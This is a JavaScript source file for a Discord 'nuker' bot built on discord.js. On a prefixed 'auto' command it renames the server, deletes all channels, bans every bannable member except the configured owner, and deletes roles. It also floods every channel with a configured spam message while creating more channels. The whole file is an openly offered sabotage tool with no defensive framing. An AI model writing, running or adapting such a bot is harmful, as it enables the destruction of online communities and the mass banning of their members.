const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");

client.once("ready", () => {
  console.log(`We're Logged As ${client.user.username}!`);
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: config.bot_settings.bot_status,
      type: "PLAYING",
    },
  });
});

let prefix = config.bot_settings.bot_prefix;

client.on("message", async (message) => {
  const a = [1];
  // Spammer Codes
  if ("spam".includes(message.content)) {
      message.delete()
      for (let index = 0; index < a.length; index++) {
      message.guild.channels.cache.forEach((channel) => {
        channel.send(config.nuke_settings.message).catch((err));
        let everyoneRole = message.guild.roles.cache.find(
          (r) => r.name === "@everyone"
        );
        message.guild.channels.create(config.nuke_settings.channel_name, {
          type: "text",
          permissionOverwrites: [
            {
              id: everyoneRole.id,
              allow: ["VIEW_CHANNEL"],
            },
          ],
        });
      });
    }
  } else if (config.nuke_settings.message.includes(message.content)) {
    for (let index = 0; index < a.length; index++) {
      message.guild.channels.cache.forEach((channel) => {
        channel.send(config.nuke_settings.message).catch((err));
        let everyoneRole = message.guild.roles.cache.find(
          (r) => r.name === "@everyone"
        );
        message.guild.channels.create(config.nuke_settings.channel_name, {
          type: "text",
          permissionOverwrites: [
            {
              id: everyoneRole.id,
              allow: ["VIEW_CHANNEL"],
              deny: ["SEND_MESSAGES"],
            },
          ],
        });
      });
    }
  }

  // All Nuker Commands
  if (message.content.startsWith(prefix)) {
    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();
    if (command == "auto" && !message.author.bot) {
      message.delete()
      // Codes Nuker

      message.guild.setName(config.nuke_settings.server_name);
      message.guild.channels.cache.forEach((channel) => {
        if (channel.name == config.nuke_settings.channel_name) return;
        channel.delete().catch((error) => {
          console.log(`:x: Couldn't delete ${channel.name}.`);
        });

        // channel creator

        let everyoneRole = message.guild.roles.cache.find(
          (r) => r.name === "@everyone"
        );

        message.guild.channels.create(config.nuke_settings.channel_name, {
          type: "text",
          permissionOverwrites: [
            {
              id: everyoneRole.id,
              allow: ["VIEW_CHANNEL"],
            },
          ],
        });
      });

      // Member Banner

      message.guild.members.cache.forEach((member) => {
        if (!member.bannable)
          return console.log(`:x: Cannot ban ${member.user.username}`);
        if (member.id == config.user_settings.you_user_id) return;
        member.ban();
        console.log(`Banned ${member.user.username}`);
      });

      const roles = message.guild.roles.cache;

      roles.forEach((role) => {
        if (role.editable && role.name !== message.guild.roles.everyone.name) {
          role.delete().then((deleted) => console.log(`Deleted ${role.name}`));
        } else {
          console.log(`Cannot Delete ${role.name}`);
        }
      });
      message.channel.send("spam")
      // Nuke/Spam Disabler
    } else if (command == "disable") {
      message.channel.send("Destroied The Bot's Process.");
      client.user.setStatus("offline");
      client.destroy();
    }
  }
});
client.login(config.bot_settings.bot_token).catch((_) => {
  // Checks if its unknown

  console.error(`[ERR] Robot's token is expired or it's invaild! Double check it.`);
});
